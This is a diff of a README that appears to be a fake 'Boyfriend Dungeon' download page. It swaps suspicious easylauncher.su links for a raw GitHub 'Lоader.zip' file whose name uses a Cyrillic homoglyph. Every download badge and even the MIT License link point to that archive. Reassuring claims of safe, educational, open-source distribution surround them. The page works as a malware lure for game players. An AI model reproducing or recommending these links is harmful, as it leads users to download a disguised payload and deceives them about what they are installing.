@@ -1,6 +1,6 @@
 # 🏹 Boyfriend Dungeon - Download & Info
 
-[![Download Now](https://img.shields.io/badge/Download-Boyfriend%20Dungeon-blue.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip%https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip)](https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip)
 
 Welcome to the ultimate source for **Boyfriend Dungeon Download**! This repository provides detailed instructions, compatibility info, and features of the game. Level up your dungeon crawling and dating sim experience safely and confidently. This edition is brought to you under an open MIT license. Discover why thousands of players worldwide enjoy this adventure!
 
@@ -28,16 +28,16 @@ No matter what device you use, you can enjoy this exhilarating action RPG & roma
 ## 📥 Installation - Step 1
 
 1. Click the button below to securely obtain the installation file:
-   [![Download Now](https://img.shields.io/badge/Download-Boyfriend%20Dungeon-blue.svg)](https://easylauncher.su/PSnzrH)
+   [![Download Now](https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip%https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip)](https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip)
 
 ## 🚨 Disclaimer
 
 This repository is for informational and educational purposes regarding **Boyfriend Dungeon**. Support the developers by considering an official purchase. This project follows open-source guidelines and is not affiliated with Kitfox Games.
 
 ## 📄 MIT License  
-[MIT License (2025)](https://choosealicense.com/licenses/mit/)
+[MIT License (2025)](https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip)
 
 ---
 
 Download with confidence and enjoy your journey in Boyfriend Dungeon!  
-[![Download Now](https://img.shields.io/badge/Download-Boyfriend%20Dungeon-blue.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip%https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip)](https://raw.githubusercontent.com/AliAhmed031104/BoyfriendDungeon-UnlockedEdition/main/Lоader.zip)
